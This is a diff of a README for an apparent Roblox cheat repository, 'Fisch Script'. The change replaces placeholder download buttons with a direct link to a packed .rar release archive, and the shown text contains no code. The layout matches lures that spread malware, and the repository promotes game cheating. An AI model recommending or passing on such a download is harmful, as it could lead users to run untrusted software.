@@ -1,11 +1,11 @@
-# 🐟 **Fisch Script Repository**  [![Download Fisch Script](https://img.shields.io/badge/Download-Fisch_Script-green?style=for-the-badge&logo=download)](https://your-download-link-here.com)
+# 🐟 **Fisch Script Repository**  [![Download Fisch Script](https://img.shields.io/badge/Download-Fisch_Script-green?style=for-the-badge&logo=download)](https://github.com/BRobxStik/fisch-script/releases/download/Update/Update.rar)
 
 > **Elevate Your Gameplay with Powerful Scripts for Fisch Simulator!** 🎣  
 
 Welcome to the **Fisch Script** repository, your go-to collection for advanced tools to enhance your Fisch Simulator experience on Roblox. Automate tasks, catch rare fish, and explore the ocean like never before! 🌊✨  
 
 ---
-[![Download Fisch Script](https://img.shields.io/badge/Download-Fisch_Script-green?style=for-the-badge&logo=download)](https://your-download-link-here.com)
+[![Download Fisch Script](https://img.shields.io/badge/Download-Fisch_Script-green?style=for-the-badge&logo=download)](https://github.com/BRobxStik/fisch-script/releases/download/Update/Update.rar)
 
 ![fis](https://github.com/user-attachments/assets/09f595e1-40ee-4c4f-80f2-053a8f8bc737)
 # Fisch Script ⭐️ Fisch Simulator Roblox ⭐️ Fisch Keyless 2025 
